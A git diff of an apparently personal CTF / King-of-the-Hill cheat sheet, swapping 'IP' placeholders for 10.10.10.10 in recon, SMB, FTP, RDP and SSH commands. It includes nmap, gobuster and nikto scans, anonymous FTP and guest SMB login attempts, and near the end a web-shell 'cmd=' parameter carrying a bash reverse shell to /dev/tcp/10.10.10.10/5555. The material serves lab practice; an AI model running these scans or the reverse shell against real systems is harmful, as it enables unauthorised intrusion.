@@ -6,39 +6,40 @@ If you like me have a folders with reverse-shells and scripts for your CTF / Kot
 
 and your IP changes just before the game starts, and no script have the correct ip.
 
-<b>pform@attacker~: </b><code>cd script-folder/</code>
+<b>pform@attacker~: </b><code>cd ~/super-ninja-scripts/</code>
 
-<b>pform@attacker~script-folder/:<code> grep -rl old-ip * | xargs sed -i 's/old-ip/new-ip/g'</code>
+<b>pform@attacker~script-folder/:<code> grep -rl 10.10.10.10 * | xargs sed -i 's/10.10.10.10/20.20.20.20/g'</code>
 
+<b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>
 
 <h2>RECON</h2> 
 
-<b>pform@attacker~: </b><code>rustscan -A IP</code>
+<b>pform@attacker~: </b><code>rustscan -A 10.10.10.10</code>
 
-<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log IP</code>
+<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.10.10</code>
 
-<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://IP -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>
+<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.10.10 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>
 
-<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host IP</code>
+<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.10.10</code>
 
 <h2>SMB</h2>
 
-<b>pform@attacker~: </b><code>smbmap -H IP</code>
+<b>pform@attacker~: </b><code>smbmap -H 10.10.10.10</code>
 
-<b>pform@attacker~: </b><code>smbclient -L \\\\IP</code>
+<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10</code>
 
-<b>pform@attacker~: </b><code>smbclient -L \\\\IP\\C$ -U guest -W WORKGROUP</code>
+<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10\\C$ -U guest -W WORKGROUP</code>
 
 
 <h2>FTP</h2>
 
 Is the host vuln to anonymous login?
 
-<b>pform@attacker~: </b><code>ftp IP</code>
+<b>pform@attacker~: </b><code>ftp 10.10.10.10</code>
 
 <b>pform@attacker~: </b>Login: <code>anonymous</code> Password: <code>anonymous</code>
 
-Dont forget to check for hidden directory´s  somethimes they hide them in plain sight like this:
+Dont forget to check for hidden directories like this:
 
 <b>pform@attacker~: </b><code>ls -la</code>
 
@@ -57,13 +58,13 @@ I think remmina is slow, compared to xfreerdp.
 
 <b>+clipboard</b> makes it possible to copy from <b>attacker machine</b> to <b>victim machine</b>
 
-<b>pform@attacker~: </b><code>xfreerdp +clipboard +window-drag /u:username /p:password /v:IP</code>
+<b>pform@attacker~: </b><code>xfreerdp +clipboard +window-drag /u:username /p:password /v:10.10.10.10</code>
 
 <h2>SSH</h2>
 
-<b>pform@attacker~: </b><code>ssh user@IP -p 22</code>
+<b>pform@attacker~: </b><code>ssh user@10.10.10.10 -p 22</code>
 
-<b>pform@attacker~: </b><code>ssh -i id_rsa user@IP -p 22</code>
+<b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.10.10 -p 22</code>
 
 <h1>Listners</1>
 
@@ -113,5 +114,7 @@ open upp burp and run command in the bottom of the page:
 <code>cmd=whomai</code>
 
 <code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
+
+
 
 
